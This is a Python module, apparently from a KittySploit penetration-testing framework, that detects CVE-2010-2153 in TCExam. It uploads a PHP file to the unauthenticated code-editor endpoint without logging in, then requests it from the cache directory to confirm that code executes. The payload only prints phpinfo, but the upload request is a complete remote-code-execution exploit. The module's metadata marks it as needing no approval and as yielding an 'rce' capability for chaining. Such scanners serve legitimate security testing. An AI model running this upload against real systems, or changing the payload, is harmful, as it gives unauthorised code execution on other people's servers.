#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Detects CVE-2010-2153 by uploading a phpinfo shell via tce_functions_tcecode_editor."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'TCExam - Unauthenticated File Upload RCE Detection (CVE-2010-2153)',
        'description': (
            'Detects CVE-2010-2153 by uploading a phpinfo shell via tce_functions_tcecode_editor.php.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2010', 'tcexam', 'upload', 'rce', 'unauth', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 4,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'rce', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2010-2153',
        ],
        'cve': 'CVE-2010-2153',
    }

    def run(self):
        from random import randint
        fname = f'ks{randint(10000,99999)}.php'
        boundary = '----WebKitFormBoundary7MA4YWxkTrZu0gW'
        php = "<?php echo 'KSPHPINFO'; phpinfo(); ?>"
        body = (
            f'--{boundary}\r\n'
            "Content-Disposition: form-data; name='sendfile0'\r\n\r\n"
            f'{fname}\r\n'
            f'--{boundary}\r\n'
            f"Content-Disposition: form-data; name='userfile0'; filename='{fname}'\r\n"
            'Content-Type: application/octet-stream\r\n\r\n'
            f'{php}\r\n'
            f'--{boundary}--\r\n'
        )
        for base in ('', '/tcexam', '/exam'):
            up = f'{base}/admin/code/tce_functions_tcecode_editor.php'
            self.http_request(
                method='POST', path=up, data=body,
                headers={
                    'Content-Type': f'multipart/form-data; boundary={boundary}',
                    'Cookie': 'LastVisit=1275442604',
                    'Origin': 'null',
                },
                allow_redirects=False,
            )
            r = self.http_request(method='GET', path=f'{base}/cache/{fname}', allow_redirects=False)
            if r and ('KSPHPINFO' in (r.text or '') or '<title>phpinfo()' in (r.text or '')):
                self.set_info(severity='critical', reason='TCExam unauthenticated upload RCE (CVE-2010-2153)', path=up)
                return True
        return False

